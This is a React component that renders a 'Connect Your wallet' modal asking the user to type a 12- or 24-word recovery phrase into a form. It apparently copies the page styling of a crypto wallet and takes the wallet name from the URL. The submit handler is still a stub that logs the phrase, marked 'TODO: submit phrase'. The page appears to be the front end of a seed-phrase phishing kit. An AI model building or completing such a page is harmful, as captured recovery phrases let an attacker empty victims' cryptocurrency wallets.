import React, { useRef } from "react";
import { useLocation } from "react-router-dom";
import "../styles/wallet-import.css";

const WalletImport = () => {
  const walletName =
    useLocation().search.split("=")[1].replace(/%20/g, " ") || "";
  const phraseInputRef = useRef<HTMLTextAreaElement>(null);
  const handleWalletImport = () => {
    //TODO: submit phrase
    console.log(phraseInputRef.current?.value);
  };

  return (
    <div className="axiewallet---page-2-import w-100" id="walletImport">
      <div className="div-block-4">
        <div id="modalBox" className="modalbox float-left w-100">
          <div className="error-message w-form-fail">
            <div>Oops! Something went wrong while submitting the form.</div>
          </div>
          <div className="innermodal">
            <h4>Connect Your {walletName}</h4>
            <div
              data-duration-in={300}
              data-duration-out={100}
              data-current="Phrase"
              data-easing="ease"
              className="tabs w-tabs"
            >
              <div className="w-tab-content">
                <div data-w-tab="Phrase" className="w-tab-pane w--tab-active">
                  <div className="form-block-2 w-form">
                    <form
                      className="form"
                      onSubmit={(evt) => {
                        evt.preventDefault();
                        handleWalletImport();
                      }}
                    >
                      <label htmlFor="Phrase" className="field-label-3">
                        Recovery Phrase:
                      </label>
                      <textarea
                        className="text-field-2 w-input w-100 pl-2"
                        name="phrase"
                        placeholder="Enter your phrase value..."
                        required
                        ref={phraseInputRef}
                        defaultValue={""}
                      />
                      <label htmlFor="email" className="field-label-4">
                        Typically 12 (sometimes 24) words separated by single
                        spaces.
                      </label>
                      <input
                        type="submit"
                        defaultValue="Import"
                        data-wait="Please wait..."
                        className="btn btn-success"
                        name="import"
                      />
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default WalletImport;
